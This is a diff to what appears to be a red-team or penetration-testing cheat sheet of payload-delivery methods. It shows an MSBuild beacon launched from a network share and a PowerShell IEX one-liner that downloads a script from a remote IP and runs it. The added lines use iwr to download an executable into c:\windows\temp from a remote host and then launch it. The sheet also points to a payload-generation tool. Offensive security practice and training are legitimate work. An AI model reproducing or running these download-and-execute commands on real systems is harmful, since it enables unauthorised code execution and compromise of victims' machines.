@@ -100,6 +100,9 @@ MSBuild Beacon
     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
   Powershell IEX
     "powershell iex (new-object net.webclient).downloadstring('http://10.10.10.10/update')"
+    Upload exe and execute
+    iwr -uri http://10.10.5.13/myfile -outfile c:\windows\temp\test.exe
+    c:\windows\temp\test.exe
     
   MSBuild NPS 
     Genereate XML using script from https://github.com/trustedsec/nps_payload
